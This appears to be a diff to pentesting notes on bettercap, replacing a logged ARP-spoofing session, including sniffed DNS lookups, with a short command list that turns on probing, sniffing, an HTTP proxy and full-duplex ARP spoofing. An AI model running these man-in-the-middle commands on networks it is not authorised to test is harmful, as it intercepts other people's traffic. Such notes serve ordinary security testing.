@@ -90,15 +90,12 @@ sudo bettercap -iface <interface>
 #### ARP spoofing
 
 ```plain
-sudo bettercap 
-» set arp.spoof.targets 10.10.10.10
-10.10.10.0/24 > 10.10.10.10  » set arp.spoof.fullduplex true
-10.10.10.0/24 > 10.10.10.10  » arp.spoof on
-10.10.10.0/24 > 10.10.10.10  » [14:15:03] [sys.log] [inf] arp.spoof arp spoofer started, probing 2 targets.
-10.10.10.0/24 > 10.10.10.10  » [14:15:03] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
-10.10.10.0/24 > 10.10.10.10  » net.sniff on
-10.10.10.0/24 > 10.10.10.10  » [14:15:14] [net.sniff.dns] dns 10.10.10.10 > test.example.com. : example.com is 10.10.10.10
-10.10.10.0/24 > 10.10.10.10  » [14:15:18] [net.sniff.dns] dns 10.10.10.10 > test.example.com. : abc.cloudapp.azure.com is 52.114.120.4
+sudo bettercap
+net.probe on
+net.sniff on
+http.proxy on
+set arp.spoof.fullduplex true
+arp.spoof on
 ```
 
 #### Use caplets
